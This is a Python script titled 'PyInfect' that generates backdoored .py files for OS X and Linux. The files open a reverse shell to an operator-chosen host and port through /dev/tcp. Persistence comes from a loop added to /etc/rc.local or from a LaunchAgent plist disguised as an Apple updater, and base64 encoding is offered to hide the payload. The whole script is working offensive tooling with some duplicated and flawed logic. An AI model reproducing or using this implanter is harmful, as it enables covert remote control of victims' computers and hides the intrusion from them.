#!/usr/bin/python
from __future__ import print_function
import base64
import os
import sys
import socket

class DevNull:
    def write(self, msg):
        pass

sys.stderr = DevNull()

color = {
    'RED'             : '\033[1;91m',
    'UNDERLINE_GREEN' : '\033[4;92m',
    'GREEN'           : '\033[1;92m',
    'YELLOW'          : '\033[1;33m',
    'WHITE'           : '\033[0;97m',
    'WHITEBU'         : '\033[1;4m' ,
    'CYAN'            : '\033[0;36m',
    'BLUE'            : '\033[0;34m',
    'MAGENTA'         : '\033[0;35m',
}

yes = ['Y', 'y', 'Ye', 'ye', 'YE', 'Yes', 'yes', 'YES']

no  = ['N', 'n', 'No', 'no', 'NO']

def getip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("192.168.1.1",80))
        host = s.getsockname()[0];s.close()
        return host
    except:
        return "127.0.0.1"

def printY(strs):
    global color
    sys.stdout.write(color['YELLOW'] + strs[0])
    sys.stdout.write(color['RED'] + strs[1] + '\n')

def append(filepath, string):
    temp = list()
    try:
        with open(filepath, 'r') as file:
            for line in file:
                temp += line

        temp = '\n'.join(temp)
        with open(filepath, 'w') as file:
            file.write(string)
            file.write(temp)
    except IOError:
        print("File not found.")

def main():
    global yes, no
    print(color['GREEN'])
    sys.stdout.softspace = False;
    printY( ["  _____       ", " _____        __          _   "] )
    printY( [" |  __ \      ", "|_   _|      / _|        | |  "] )
    printY( [" | |__) |   _ ", "  | |  _ __ | |_ ___  ___| |_ "] )
    printY( [" |  ___/ | | |", "  | | | '_ \|  _/ _ \/ __| __|"] )
    printY( [" | |   | |_| |", " _| |_| | | | ||  __/ (__| |_ "] )
    printY( [" |_|    \__, |", "|_____|_| |_|_| \___|\___|\__|"] )
    printY( ["         __/ |", "                              "] )
    printY( ["        |___/ ", "                              "] )
    print()
    print(''.join( ['Backdoor ', color['GREEN'], 'any ', color['YELLOW'], '.py ', color['GREEN'], 'file', color['BLUE'], ' //', color['GREEN'], ' Backdoor implanter for ', color['CYAN'], 'OS X', color['GREEN'], ' - Compatible with ', color['MAGENTA'], 'EggShell', color['GREEN'], '!', color['WHITE'],'\n']) )


    lhost = getip()
    lport = "4444"

    hostChoice = get_input(color['CYAN'] + "Set LHOST (Leave blank for " + lhost + "): " + color['GREEN'])
    if hostChoice == "": hostChoice = lhost

    portChoice = get_input(color['CYAN'] + "Set LPORT (Leave blank for " + str(lport) + "): " + color['GREEN'])
    if portChoice == "": portChoice = lport
    print()

    interval = get_input(color['CYAN'] + "Persistence Interval (Leave blank for 60sec) [1-86400]: " + color['GREEN'])
    if interval == "": interval = "60"
    print()

    filename = get_input(color['CYAN'] + "Filename (example.py): " + color['GREEN'])
    if ".py" not in filename: filename += ".py"

    encode = get_input(color['CYAN'] + "Encode to Base64? [Y/N]: " + color['GREEN'])
    print()
    
    OS = 0
    while not int(OS) in [1,2]:
        print("Choose a target OS:")
        print()
        print("1) OS X")
        print("2) Linux\n")
        OS = get_input("OS Choice [1,2]: ")

    if OS == "2":
        command = "while sleep " + interval + "; do bash &> /dev/tcp/" + hostChoice + "/" + portChoice + " 0>&1; done"
        
        if encode in yes:
            encoded = base64.b64encode(command)
            append("/etc/rc.local","echo " + encoded + "| base64 -D" + "\n")
        
        elif encode in no:
            append("/etc/rc.local", "\n")
    
    elif OS == "1":
        command = '''mkdir -p ~/Library/LaunchAgents || true;echo "<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0">
        <dict>
            <key>Label</key>
            <string>com.zerowidth.launched.appleupdater</string>
            <key>ProgramArguments</key>
            <array>
                <string>sh</string>
                <string>-c</string>
                <string>bash &amp;&gt; /dev/tcp/''' + hostChoice + '''/''' + portChoice + ''' 0&gt;&amp;1</string>
            </array>
            <key>RunAtLoad</key>
            <true/>
            <key>StartInterval</key>
            <integer>''' + interval + '''.0</integer>
        </dict>
        </plist>
        
        " >> ~/Library/LaunchAgents/com.zerowidth.launched.appleupdater.plist || true;launchctl load -w ~/Library/LaunchAgents/com.zerowidth.launched.appleupdater.plist || true'''
        
    if encode in yes:
        encoded = base64.b64encode(command)
        
        file = open(filename,"w")
        file.write('import os\n')
        file.write('import sys\n\n')
        file.write('os.system("echo '+encoded+' | base64 -D")\n')
        file.close()
    
    elif encode in no:
        file = open(filename,"w")
        file.write('import os\n')
        file.write('import sys\n\n')
        file.write('os.system("""' + command + '""")')
        file.close()
    
    else:
        print(color['RED'] + "Error: Invalid choice." + color['WHITE'])
        os._exit(1)
        
    if encode in yes:
        encoded = base64.b64encode(command)
        
        with open(filename, "w") as file:
            file.write('import os\n')
            file.write('import sys\n\n')
            file.write('os.system("echo ' + encoded + ' | base64 -D")\n')

    elif encode in no:
        with open(filename, "w") as file:
            file.write('import os\n')
            file.write('import sys\n\n')
            file.write('os.system("""' + command + '""")')

    else:
        print(color['RED'] + "Error: Invalid choice." + color['WHITE'])
        os._exit(1)

    print(color['GREEN'] + "Backdoor implanted successfully - Saved as " + color['MAGENTA'] + filename + color['WHITE'])


if __name__ == "__main__":
    get_input = input

    if sys.version_info[:2] <= (2, 7):
        get_input = raw_input

    try:
        main()
    except:
        print(color['RED'] + "\nExiting..." + color['WHITE'])
